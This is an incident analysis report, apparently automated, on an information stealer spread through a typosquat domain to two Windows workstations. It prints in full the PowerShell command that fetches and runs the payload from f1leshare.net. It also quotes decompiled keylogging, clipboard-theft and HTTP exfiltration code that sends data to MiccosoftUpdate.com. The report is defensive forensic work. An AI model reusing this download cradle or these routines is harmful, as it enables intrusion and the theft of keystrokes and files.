# Incident Analysis Report

## Executive Summary

A sophisticated malware infection was detected across multiple Windows workstations. The attack involved a typosquatting domain (`f1leshare.net`) used to distribute a multi-functional information stealer with keylogging, clipboard monitoring, and data exfiltration capabilities. The malware established persistence through registry modifications and masqueraded as legitimate Microsoft software.

**Affected Hosts:** anders-desktop, john-desktop  
**Time Range:** 2026-03-29 17:46:55 UTC to 2026-03-29 17:51:53 UTC  
**Malware Hash (SHA256):** `254601603f918d20338739b1eb4cb15bd31525aa5bcc2520c0432bb055603d7d`

---

## 1. Timeline Summary

### Attack Vector
The attack began with a PowerShell-based download cradle executed on both anders-desktop and john-desktop. The PowerShell command disabled SSL certificate validation and downloaded the malware from `http://f1leshare.net/download/updater`.

**PowerShell Command (confirmed):**
```powershell
powershell.exe -exec bypass -windowstyle hidden -command "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; IWR -Uri 'http://f1leshare.net/download/updater' -OutFile $env:TEMP\updater.exe -UseBasicParsing; & $env:TEMP\updater.exe"
```

### Chronology of Events

| Timestamp (UTC) | Host | Event |
|-----------------|------|-------|
| 2026-03-29T17:46:55.768Z | anders-desktop | PowerShell execution started |
| 2026-03-29T17:47:11.586Z | anders-desktop | updater.exe created in Temp folder |
| 2026-03-29T17:47:20.142Z | anders-desktop | updater.exe process started (PID 12276) |
| 2026-03-29T17:47:21.475Z | anders-desktop | File copied to: `C:\Users\anders\AppData\Local\Microsoft\updater.exe` |
| 2026-03-29T17:47:21.479Z | anders-desktop | Registry persistence created: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdater` |
| 2026-03-29T17:47:21.479Z | anders-desktop | Startup folder persistence: `msteamsupdater.exe` |
| 2026-03-29T17:47:45.308Z | john-desktop | PowerShell execution started |
| 2026-03-29T17:48:22.628Z | anders-desktop | Discovery: `cmd.exe /c dir "C:\Users"` |
| 2026-03-29T17:49:09.876Z | john-desktop | updater.exe created in Temp folder |
| 2026-03-29T17:49:12.488Z | john-desktop | updater.exe process started (PID 10872) |
| 2026-03-29T17:49:22.963Z | anders-desktop | Discovery: `cmd.exe /c dir "C:\Users\anders\Documents"` |
| 2026-03-29T17:50:53.185Z | anders-desktop | Discovery: `cmd.exe /c dir "C:\Users\anders\Desktop"` |
| 2026-03-29T17:51:53.313Z | anders-desktop | **Data Collection: `cmd.exe /c type "C:\Users\anders\Desktop\polen.eml"`** |

### Impact
- **2 hosts compromised**: anders-desktop, john-desktop
- **Persistence established**: Registry Run key and Startup folder
- **Data accessed**: Email file `polen.eml` from Desktop was read
- **C2 communications**: DNS queries to f1leshare.net, HTTP traffic to MiccosoftUpdate.com
- **Active monitoring**: Keylogging and clipboard monitoring capabilities present

---

## 2. Indicators of Compromise (IOCs)

### 2.1 Network Indicators

#### 2.1.1 Malicious Domain: f1leshare.net
- **Description**: Typosquatting domain used for initial malware distribution ("f1leshare" mimics "fileshare")
- **Evidence Query**: `logs-network.dns` index search for `dns.question.name: "f1leshare.net"`
- **Raw Data**:
```json
{
  "dns": {
    "question": {
      "name": "f1leshare.net",
      "registered_domain": "f1leshare.net",
      "type": "A"
    },
    "answers": [{
      "data": "10.3.124.26",
      "name": "f1leshare.net",
      "type": "A"
    }],
    "resolved_ip": ["10.3.124.26"]
  },
  "source.ip": "10.3.10.22",
  "destination.ip": "10.3.10.254"
}
```
- **Context**: DNS queries observed from both anders-desktop and john-desktop. Domain resolves to attacker-controlled IP 10.3.124.26.

#### 2.1.2 Command & Control Domain: MiccosoftUpdate.com
- **Description**: Typosquatting C2 domain ("Miccosoft" mimics "Microsoft")
- **Evidence Query**: Ghidra string analysis and decompiled code
- **Raw Data** (from Ghidra decompilation of `FUN_1400017b0`):
```c
void FUN_1400017b0(undefined8 param_1,undefined8 param_2,undefined4 param_3) {
  uVar1 = InternetOpenA("Mozilla/5.0",1,0,0,0);
  uVar1 = InternetConnectA(DAT_140017040,"MiccosoftUpdate.com",0x50,0,0,3,0,0);
  uVar2 = HttpOpenRequestA(uVar1,&DAT_140013029,param_1,"HTTP/1.1",0,0,0,0);
  HttpSendRequestA(uVar2,"Content-Type: application/octet-stream\r\n",0xffffffff,param_2,param_3);
  // ...
}
```
- **Context**: Malware exfiltrates encrypted data via HTTP POST to port 80 (0x50). Uses fake Mozilla/5.0 User-Agent.

#### 2.1.3 C2 IP Address: 10.3.124.26
- **Description**: Attacker-controlled infrastructure hosting C2 server
- **Evidence**: DNS resolution records and network flow logs
- **Context**: Internal IP suggests attacker has network presence or is using compromised internal infrastructure

### 2.2 File System Indicators

#### 2.2.1 Malware Executable: updater.exe
- **Description**: Primary malware payload
- **SHA256**: `254601603f918d20338739b1eb4cb15bd31525aa5bcc2520c0432bb055603d7d`
- **MD5**: Not available
- **Imphash**: `e065512b1f6ae044e32b671b922b8349`
- **File Paths**:
  - `C:\Users\anders\AppData\Local\Temp\updater.exe` (initial drop)
  - `C:\Users\anders\AppData\Local\Microsoft\updater.exe` (persistence copy)
  - `C:\Users\john\AppData\Local\Temp\updater.exe`
- **File Size**: 88,576 bytes
- **Header Bytes**: `4d5a90000300000004000000ffff0000` (MZ executable)

#### 2.2.2 Persistence File: msteamsupdater.exe
- **Description**: Copy of malware placed in Startup folder for persistence
- **Path**: `C:\Users\anders\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\msteamsupdater.exe`
- **Context**: Masquerades as Microsoft Teams updater to blend with legitimate software

### 2.3 Registry Indicators

#### 2.3.1 Run Key Persistence
- **Description**: Registry modification for automatic execution at login
- **Evidence Query**: `logs-endpoint.events.registry` index
- **Raw Data**:
```json
{
  "registry": {
    "hive": "HKEY_USERS",
    "key": "S-1-5-21-2720038117-2954272070-1833396500-1002\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    "path": "HKEY_USERS\\...\\Run\\MicrosoftUpdater",
    "value": "MicrosoftUpdater",
    "data": {
      "strings": ["C:\\Users\\anders\\AppData\\Local\\Microsoft\\updater.exe"],
      "type": "REG_SZ"
    }
  }
}
```
- **Context**: Confirmed persistence mechanism matching Ghidra analysis

#### 2.3.2 Task Scheduler Cache
- **Description**: Registry key created to potentially interfere with task scheduling
- **Path**: `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MicrosoftUpdater`
- **Evidence**: Ghidra decompilation of `FUN_140002e83`

### 2.4 Process Indicators

#### 2.4.1 Mutex: Global\MicrosoftUpdateMutex
- **Description**: Single-instance mutex to prevent multiple malware executions
- **Evidence**: Ghidra decompilation of `FUN_14000318b`:
```c
undefined8 FUN_14000318b(void) {
  hMutex = CreateMutexA((LPSECURITY_ATTRIBUTES)0x0,1,"Global\\MicrosoftUpdateMutex");
  if (hMutex == (HANDLE)0x0) {
    uVar3 = 0;
  } else {
    DVar1 = GetLastError();
    if (DVar1 == 0xb7) {  // ERROR_ALREADY_EXISTS
      CloseHandle(hMutex);
      uVar3 = 0;
    } else {
      LVar2 = GetSystemDefaultLCID();
      if ((short)LVar2 == 0x419) {  // Russian locale check
        ReleaseMutex(hMutex);
        CloseHandle(hMutex);
        uVar3 = 0;
      } else {
        uVar3 = 1;
      }
    }
  }
  return uVar3;
}
```
- **Context**: Malware exits if mutex already exists (prevents re-infection). Also checks for Russian locale (0x419) and exits if detected - common evasion technique.

---

## 3. Malware Capabilities (MITRE ATT&CK Mapping)

### 3.1 Initial Access
- **Technique**: T1566.001 - Phishing: Spearphishing Attachment (hypothesis - delivery mechanism unknown)
- **Technique**: T1059.001 - Command and Scripting Interpreter: PowerShell (confirmed)

### 3.2 Execution
- **Technique**: T1059.003 - Windows Command Shell (confirmed)
  - Evidence: `cmd.exe /c dir` commands spawned by updater.exe

### 3.3 Persistence
- **Technique**: T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys (confirmed)
  - Evidence: Registry modification to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdater`
- **Technique**: T1547.001 - Startup Folder (confirmed)
  - Evidence: File creation at `...\Startup\msteamsupdater.exe`

### 3.4 Defense Evasion
- **Technique**: T1497.001 - Virtualization/Sandbox Evasion: System Checks (confirmed)
  - Evidence: Russian locale check (LCID 0x419) in `FUN_14000318b`
- **Technique**: T1027 - Obfuscated Files or Information (confirmed)
  - Evidence: AES encryption for C2 communications
- **Technique**: T1070.004 - File Deletion (confirmed)
  - Evidence: Self-delete capability in `FUN_1400020c7`

### 3.5 Discovery
- **Technique**: T1083 - File and Directory Discovery (confirmed)
  - Evidence: Multiple `cmd.exe /c dir` commands targeting:
    - `C:\Users`
    - `C:\Users\anders\Documents`
    - `C:\Users\anders\Desktop`

### 3.6 Collection
- **Technique**: T1056.001 - Input Capture: Keylogging (confirmed)
  - Evidence: Ghidra decompilation of `FUN_140003233` showing GetAsyncKeyState loop:
```c
// Keylogging loop from FUN_140003233
*(undefined4 *)(&stack0x00001540 + lVar1) = 8;
while (*(int *)(&stack0x00001540 + lVar1) < 0x100) {
  uVar3 = GetAsyncKeyState(*(int *)(&stack0x00001540 + lVar1));
  if ((uVar3 & 1) != 0) {
    // Process keystroke
  }
}
```

- **Technique**: T1115 - Clipboard Data (confirmed)
  - Evidence: Ghidra decompilation of `FUN_140001f13`:
```c
int FUN_140001f13(void *param_1,int param_2) {
  BVar1 = OpenClipboard((HWND)0x0);
  if (BVar1 != 0) {
    hMem = GetClipboardData(1);  // CF_TEXT
    if (hMem != (HANDLE)0x0) {
      _Str = (char *)GlobalLock(hMem);
      // Copy clipboard content
      memcpy(param_1,_Str,(longlong)local_c);
      GlobalUnlock(hMem);
    }
    CloseClipboard();
  }
}
```

- **Technique**: T1005 - Data from Local System (confirmed)
  - Evidence: `cmd.exe /c type "C:\Users\anders\Desktop\polen.eml"` - email file accessed

### 3.7 Command and Control
- **Technique**: T1071.001 - Application Layer Protocol: Web Protocols (confirmed)
  - Evidence: HTTP POST to `MiccosoftUpdate.com/api/data`
- **Technique**: T1573.001 - Encrypted Channel: Symmetric Cryptography (confirmed)
  - Evidence: AES-ECB encryption using BCrypt API

### 3.8 Exfiltration
- **Technique**: T1041 - Exfiltration Over C2 Channel (confirmed)
  - Evidence: Encrypted data sent via HTTP POST to `/api/data` endpoint

---

## 4. Technical Analysis

### 4.1 Encryption Implementation
The malware uses Windows BCrypt API for AES encryption in ECB mode:

```c
// From FUN_140001b8c
BCryptOpenAlgorithmProvider(&hAlgorithm, L"AES", NULL, 0);
BCryptSetProperty(hAlgorithm, L"ChainingMode", L"ChainingModeECB", 0x20, 0);
BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, key, 16, 0);
BCryptEncrypt(hKey, plaintext, cbInput, NULL, NULL, 0, ciphertext, cbOutput, &cbResult, 0);
```

**Security Note**: ECB mode is cryptographically weak as identical plaintext blocks produce identical ciphertext blocks.

### 4.2 Data Exfiltration Protocol
1. Collects data (keystrokes, clipboard, window titles)
2. Encrypts using AES-ECB with key derived from hostname
3. Base64 encodes the encrypted data
4. Sends via HTTP POST to `MiccosoftUpdate.com/api/data`

### 4.3 C2 Endpoints
- `/api/info` - Initial beacon with system information
- `/api/data` - Exfiltration endpoint for collected data
- `/update/servicedata` - Additional C2 channel
- `/windows/checkforupdate` - Check-in endpoint

### 4.4 System Information Collected
Format string from binary:
```
"Host: %s\nUser: %s\nArch: %s\nCPUs: %lu\nRAM: %llu MB\n"
```

---

## 5. Recommendations

### Immediate Actions
1. **Isolate affected hosts**: anders-desktop, john-desktop
2. **Block IOCs**:
   - Domain: `f1leshare.net`
   - Domain: `MiccosoftUpdate.com`
   - IP: `10.3.124.26`
3. **Remove persistence**:
   - Delete registry key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdater`
   - Delete file: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\msteamsupdater.exe`
   - Delete file: `%LOCALAPPDATA%\Microsoft\updater.exe`
4. **Kill processes**: Any running `updater.exe` processes

### Investigation Steps
1. Review email file `polen.eml` for sensitive content
2. Check for additional compromised hosts by searching for:
   - DNS queries to f1leshare.net
   - HTTP connections to MiccosoftUpdate.com
   - Presence of updater.exe or msteamsupdater.exe
3. Analyze clipboard history and keystroke logs (if available from backups)
4. Review network logs for data exfiltration volume

### Long-term Hardening
1. Implement application whitelisting
2. Enable PowerShell Constrained Language Mode
3. Deploy web filtering for typosquatting domains
4. Implement clipboard monitoring detection
5. Enable registry monitoring for Run key modifications

---

## 6. Evidence Sources

| Source | Data Type | Records |
|--------|-----------|---------|
| logs-endpoint.events.process | Process execution | 6 events |
| logs-endpoint.events.file | File operations | 5 events |
| logs-endpoint.events.registry | Registry modifications | 1 event |
| logs-network.dns | DNS queries | 124 events |
| logs-network.flow | Network flows | 136 events |
| Ghidra | Binary analysis | Full decompilation |

---

## 7. Confidence Levels

| Finding | Confidence | Evidence |
|---------|------------|----------|
| Malware infection on anders-desktop | **Confirmed** | Process events, file creation, registry modification |
| Malware infection on john-desktop | **Confirmed** | Process events, file creation |
| Keylogging capability | **Confirmed** | Ghidra decompilation showing GetAsyncKeyState loop |
| Clipboard monitoring | **Confirmed** | Ghidra decompilation showing OpenClipboard/GetClipboardData |
| Data exfiltration | **Confirmed** | HTTP POST function in binary, network connections observed |
| Email file accessed | **Confirmed** | Process event showing `type polen.eml` |
| Russian locale evasion | **Confirmed** | Ghidra decompilation showing LCID 0x419 check |
| C2 domain: MiccosoftUpdate.com | **Confirmed** | Hardcoded in binary, HTTP function present |

---

*Report generated: 2026-04-29*  
*Analyst: Automated Incident Analysis System*
